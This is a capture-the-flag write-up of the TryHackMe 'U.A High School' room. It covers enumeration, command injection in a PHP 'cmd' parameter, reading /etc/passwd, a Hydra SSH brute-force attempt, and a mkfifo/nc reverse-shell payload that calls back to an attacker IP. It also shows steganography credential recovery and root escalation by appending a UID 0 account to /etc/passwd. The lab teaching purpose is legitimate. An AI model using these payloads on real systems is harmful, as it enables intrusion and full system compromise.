---
title: "Challenges: U.A High School (TryHackMe)"
datePublished: Fri Jul 18 2025 21:00:00 GMT+0000 (Coordinated Universal Time)
cuid: cmdnm75j1000202js22odaaq5
slug: challenges-ua-high-school-tryhackme
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1753737309224/7720364f-55a5-4027-9818-fa0dbd6cd603.png
tags: linux, tryhackme, websecurity, ctf-writeup, privilege-escalation

---

This challenge tasked us with testing the security of a web application developed by U.A., the renowned Superhero Academy. The objective was to identify vulnerabilities, gain initial foothold access, escalate privileges, and ultimately retrieve the required flags. To achieve this, we began with network and directory enumeration using tools such as `nmap` and `gobuster`. This initial phase revealed accessible web endpoints that allowed command execution via the `cmd` parameter. Using this entry point, we gained shell access as the `www-data` user, discovered hidden files, decoded embedded credentials, and leveraged them to pivot into a user account with SSH access.  
  
  
  
Join us in the mission to protect the digital world of superheroes! U.A., the most renowned Superhero Academy, is looking for a superhero to test the security of our new site.

Our site is a reflection of our school values, designed by our engineers with incredible Quirks. We have gone to great lengths to create a secure platform that reflects the exceptional education of the U.A.

Please allow the machine 3 - 5 minutes to fully boot.

### Answer the questions below

1. What is the user.txt flag?  
      
    The challenge focused on identifying vulnerabilities in a superhero-themed web application. We began with reconnaissance using `nmap` to scan for open ports and `gobuster` to enumerate directories and files. This revealed an `index.php` page under `/assets` with a `cmd` parameter is vulnerable to command injection.  
    
    `nmap -sV IP_Address`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753120133570/1e276dfe-152d-4c12-b6a4-9e5322dc0118.png align="center")
    
    `gobuster dir -u http://IP_Address -w /usr/share/wordlists/dirb/common.txt`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753120244465/edfe695d-4f75-44d2-8523-9ea29bd660bc.png align="center")
    
    `gobuster dir -u http://IP_Address/assets -w /usr/share/wordlists/dirb/common.txt -x php,html,txt`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753734390051/e5b1de23-837f-4976-9eb8-c08f3342a1ef.png align="center")
    
    `gobuster dir -u http://IP_Address/assets -w /usr/share/wordlists/dirb/common.txt -x php,html,txt`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753734526580/1992bb74-e7d3-426d-baa0-77777995eae7.png align="center")
    
      
    Testing this parameter allowed us to execute commands on the host, including reading `/etc/passwd`, which revealed a user named `deku`. We attempted to brute force `deku`’s SSH credentials using Hydra, but it was unsuccessful. Instead, we exploited the command injection to establish a reverse shell back to our machine using `nc` and `curl`.  
      
    `http://IP_Address/assets/index.php?cmd=ls`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753734608667/15fe70ff-c3d4-4736-b80b-0a6d46b4dec4.png align="center")
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753734643323/23119da1-6b8a-4ca6-ba8a-a14042218ae8.png align="center")
    
    `http://IP_Address/assets/index.php?cmd=cat /etc/passwd`
    
    ```makefile
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
    systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
    systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
    messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
    syslog:x:104:110::/home/syslog:/usr/sbin/nologin
    _apt:x:105:65534::/nonexistent:/usr/sbin/nologin
    tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
    uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
    tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
    landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
    pollinate:x:110:1::/var/cache/pollinate:/bin/false
    fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
    usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
    sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
    systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
    deku:x:1000:1000:deku:/home/deku:/bin/bash
    
    lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
    ubuntu:x:1001:1002:Ubuntu:/home/ubuntu:/bin/bash
    ```
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753734671876/05b429e7-5e9d-45b8-9a17-3d2097dec8da.png align="center")
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753734781723/0b10a691-c797-470d-8e03-6a2a5df81713.png align="center")
    
    We had a user called deku who revealed before tried using Hydra and SSH to find the user’s password, but it didn’t work:
    
      
    `hydra -l deku -P /usr/share/wordlists/rockyou.txt ssh://IP_Address`  
      
    Run these two commands in separate tabs:  
      
    `nc -lvnp 443`
    
      
    `curl -s 'http://IP_Address/assets/index.php' -G --data-urlencode 'cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.250.155 443 >/tmp/f'`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753734968644/518e64bd-1938-4d39-bf54-30ac521f0cc9.png align="center")
    
    Once inside as the `www-data` user, we discovered a hidden folder named `Hidden_Content`, which contained a `passphrase.txt` file encoded in Base64 and an image (`oneforall.jpg`) with a corrupted header. After repairing the header using `hexedit`, we extracted hidden data using `steghide`, which revealed credentials for the `deku` account. Using these credentials, we successfully logged in via SSH and located the `user.txt` flag.  
      
    After running the curl command, check the tab that has `nc -lvnp 443` and we get access to www-data  
      
    We found a `Hidden_Content` folder that had a `passphrase.txt` file. We checked the content and decoded the base64 hash
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753735037845/17e7d653-ccb4-433c-be96-8ed43bb79a0d.png align="center")
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753735261899/1f299691-e4c6-431c-931f-e16483bfbc92.png align="center")
    
    There was a JPG image that we had to fix the header  
      
    `cp oneforall.jpg fixed.jpg`  
      
    `hexedit fixed.jpg`
    
    ```makefile
    
    FF D8 FF E0    00 10 4A 46    49 46
    ```
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753735448079/43329e3c-eaca-49c0-8402-ae8551eee0e3.png align="center")
    
    `steghide extract -sf fixed.jpg`  
      
    The passphrase: `AllmightForEver!!!`  
      
    `cat creds.txt`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753735535691/6b8f9b43-909a-4264-aa81-97627b02f3af.png align="center")
    
    The credentials of `deku` are now revealed, so we’ll access the user through SSH  
      
    `ssh deku@IP_Address`  
      
    `find / -type f -name user.txt 2>/dev/null`  
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753735706735/60187709-e0e9-4def-85df-ed291f1dbc9b.png align="center")
    
2. What is the root.txt flag?  
      
    For privilege escalation, we examined `sudo -l` output and identified a script (`/opt/NewComponent/`[`feedback.sh`](http://feedback.sh)) that could be run with elevated privileges. Although direct modification of `/etc/passwd` was restricted, the script allowed us to append a custom root-level user. By adding our own user entry with UID 0, we escalated to root privileges, located the `root.txt` flag, and completed the challenge.  
      
    `sudo -l`  
      
    `pwd`  
      
    `cat /opt/NewComponent/feedback.sh`  
      
    `sudo /opt/NewComponent/feedback.sh`  
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753735776849/f23a4b7a-00ec-454c-9efb-142b64066a2e.png align="center")
    
    `cat /tmp/test.txt`  
      
    `ls -la /tmp/test.txt`  
      
    `mkpasswd -m md5crypt -s` // need admin permission
    
      
    `nano /etc/passwd`  
    
    tried to add: `jxf:$1$kuPU0rVy$4lAgUF14dQf/afCWdyITu0:0:0:jxf:/root:/bin/bash` to /etc/passwd but we only had read-only access  
      
    `sudo /opt/NewComponent/feedback.sh`  
      
    copied: `jxf:$1$kuPU0rVy$4lAgUF14dQf/afCWdyITu0:0:0:jxf:/root:/bin/bash`  
      
    `tail -n1 /etc/passwd`  
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753736082567/3a591617-edee-4c5a-b294-751684350d4c.png align="center")
    
    `nano /etc/passwd`  
      
    confirming that `jxf:$1$kuPU0rVy$4lAgUF14dQf/afCWdyITu0:0:0:jxf:/root:/bin/bash` has been added to `/etc/passwd`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753736018365/ed7d4e99-6169-46e7-abe8-5db8aad33a8f.png align="center")
    
    `su - jxf`  
      
    `find / -type f -name root.txt 2>/dev/null   `  
    `cat /root/root.txt`  
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753736268362/9db6698a-68e2-4a27-bf4d-2ea5339b9a81.jpeg align="center")
    

By chaining together web exploitation, reverse shell access, credential discovery, and privilege escalation through a vulnerable script, we successfully retrieved both the `user.txt` and `root.txt` flags. This exercise demonstrated how multiple small vulnerabilities—such as arbitrary command execution, insecure file permissions, and weak credential management—can be exploited in sequence to compromise a system fully. It reinforced the importance of secure coding, proper file access controls, and credential handling in protecting real-world systems.